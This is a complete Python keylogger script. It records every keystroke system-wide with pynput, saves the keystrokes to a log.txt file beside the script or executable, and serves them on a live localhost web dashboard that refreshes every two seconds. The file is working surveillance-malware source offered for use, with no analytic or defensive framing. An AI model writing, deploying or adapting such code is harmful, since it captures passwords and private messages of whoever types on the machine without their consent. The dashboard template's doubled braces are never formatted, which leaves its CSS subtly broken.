import os
import sys
import time
import threading
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
from pynput import keyboard

# ---------- Storage ----------
LOG_DIR = os.path.dirname(sys.executable) if getattr(sys, 'frozen', False) else os.path.dirname(os.path.abspath(__file__))
LOG_FILE = os.path.join(LOG_DIR, "log.txt")

buffer = []            # list of (timestamp, text)
lock = threading.Lock()
MAX_ENTRIES = 2000

def append_entry(text):
    ts = datetime.now().strftime("%H:%M:%S")
    with lock:
        buffer.append((ts, text))
        if len(buffer) > MAX_ENTRIES:
            del buffer[:len(buffer) - MAX_ENTRIES]
    # also persist to disk
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(text)
    except Exception:
        pass

# ---------- Key handling ----------
def on_press(key):
    try:
        if key.char is not None:
            append_entry(key.char)
            return
    except AttributeError:
        pass
    if key == keyboard.Key.space:
        append_entry(" ")
    elif key == keyboard.Key.enter:
        append_entry("\n")
    elif key == keyboard.Key.tab:
        append_entry("\t")
    elif key == keyboard.Key.backspace:
        append_entry("<BACKSPACE>")
    else:
        append_entry(f"[{key.name}]")

listener = keyboard.Listener(on_press=on_press)
listener.start()

# ---------- HTML dashboard ----------
HTML_PAGE = """<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Keylogger Dashboard</title>
<style>
  body {{ font-family: monospace; background:#111; color:#0f0; padding:16px; }}
  h1 {{ color:#0f0; font-size:18px; }}
  #log {{ background:#000; padding:12px; border:1px solid #0f0; height:70vh; overflow-y:auto; white-space:pre-wrap; word-wrap:break-word; }}
  .ts {{ color:#0a0; }}
  .info {{ color:#888; font-size:12px; }}
</style>
</head>
<body>
<h1>Keylogger Dashboard (live)</h1>
<div class="info">Endpoint: /data | Auto-refresh every 2s | Log file: log.txt</div>
<div id="log">Loading...</div>
<script>
async function refresh() {{
  try {{
    const r = await fetch('/data');
    const data = await r.json();
    const el = document.getElementById('log');
    el.innerHTML = data.html || '<span class="info">No keystrokes yet...</span>';
    el.scrollTop = el.scrollHeight;
  }} catch(e) {{}}
}}
refresh();
setInterval(refresh, 2000);
</script>
</body>
</html>
"""

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            body = HTML_PAGE.encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        elif self.path == "/data":
            import json
            with lock:
                snapshot = list(buffer)
            parts = []
            for ts, text in snapshot:
                esc = (text.replace("&", "&amp;")
                           .replace("<", "&lt;")
                           .replace(">", "&gt;"))
                parts.append(f'<span class="ts">[{ts}]</span> {esc}')
            payload = {"html": "<br>".join(parts)}
            body = json.dumps(payload).encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "application/json; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        else:
            self.send_response(404)
            self.end_headers()
    def log_message(self, fmt, *args):
        pass  # silence access logs

def run_server():
    HTTPServer(("127.0.0.1", 8000), Handler).serve_forever()

# ---------- Start ----------
if __name__ == "__main__":
    threading.Thread(target=run_server, daemon=True).start()
    print("Keylogger running. Open http://127.0.0.1:8000 in your browser.")
    print("Log file:", LOG_FILE)
    try:
        listener.join()
    except KeyboardInterrupt:
        listener.stop()